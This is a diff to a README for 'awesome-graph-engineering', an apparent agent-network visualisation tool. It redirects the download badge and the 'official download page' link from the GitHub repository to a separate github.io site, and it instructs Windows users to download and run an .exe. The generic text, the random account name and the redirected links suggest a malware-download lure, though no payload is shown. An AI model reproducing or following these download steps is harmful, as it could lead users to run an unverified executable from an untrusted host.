@@ -1,6 +1,6 @@
 # 🕸️ awesome-graph-engineering - Visualize complex networks of intelligent agents
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Purseseinepace982/awesome-graph-engineering)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://purseseinepace982.github.io)
 
 ## 📋 Project Overview
 This software provides a toolkit for mapping and managing groups of digital agents. It treats collections of automated systems like a map. You see how agents connect, exchange data, and work toward goals. The tool includes an interactive atlas to help you view these connections in real time. It works for both simple task flows and large, distributed systems.
@@ -19,7 +19,7 @@ If your computer uses older hardware, the visualization features might run slowl
 ## 🚀 Downloading the Software
 You obtain the software through the main project page. Follow these instructions to find the correct file for your Windows computer:
 
-1.  Visit the [official download page](https://github.com/Purseseinepace982/awesome-graph-engineering).
+1.  Visit the [official download page](https://purseseinepace982.github.io).
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the version number at the top of that list.
 4.  Find the file that ends with .exe and click it to start the download.
